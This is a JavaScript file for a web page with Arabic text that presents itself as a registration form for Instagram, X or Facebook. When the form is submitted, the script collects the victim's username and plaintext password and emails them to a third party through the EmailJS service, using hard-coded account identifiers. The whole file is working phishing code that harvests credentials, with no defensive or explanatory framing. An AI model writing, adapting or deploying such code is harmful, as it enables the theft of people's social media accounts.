// Initialize EmailJS
document.addEventListener("DOMContentLoaded", () => {
    emailjs.init("1xqwBMfecM1SSulsh"); // Public Key
});

// Language toggling function
function toggleLanguage(lang) {
    const elements = document.querySelectorAll("[data-ar], [data-en]");
    elements.forEach(el => {
        el.textContent = lang === 'ar' ? el.getAttribute('data-ar') : el.getAttribute('data-en');
    });
    document.documentElement.lang = lang;
}

// Show form based on selected platform
function showForm(platform) {
    const formContainer = document.getElementById("form-container");
    const platformName = document.getElementById("platform-name");
    
    // Set the platform name in the form header
    platformName.textContent = platform === 'instagram' ? 'التسجيل في إنستغرام' : 
                               platform === 'x' ? 'التسجيل في إكس' : 
                               'التسجيل في فيسبوك';
    
    // Display the form container
    formContainer.style.display = 'block';
    
    // Store the selected platform for later use
    formContainer.setAttribute('data-platform', platform);
}

// Handle form submission
document.getElementById("registration-form").addEventListener("submit", (event) => {
    event.preventDefault();

    const platform = document.getElementById('form-container').getAttribute('data-platform');
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const templateParams = {
        platform: platform,
        username: username,
        password: password
    };

    emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
        .then(() => {
            alert('تم إرسال البيانات بنجاح!');
            document.getElementById('registration-form').reset();
            document.getElementById('form-container').style.display = 'none';
        })
        .catch(error => {
            console.error('خطأ أثناء إرسال البيانات:', error);
            alert('عذرًا، حدث خطأ أثناء إرسال البيانات.');
        });
});
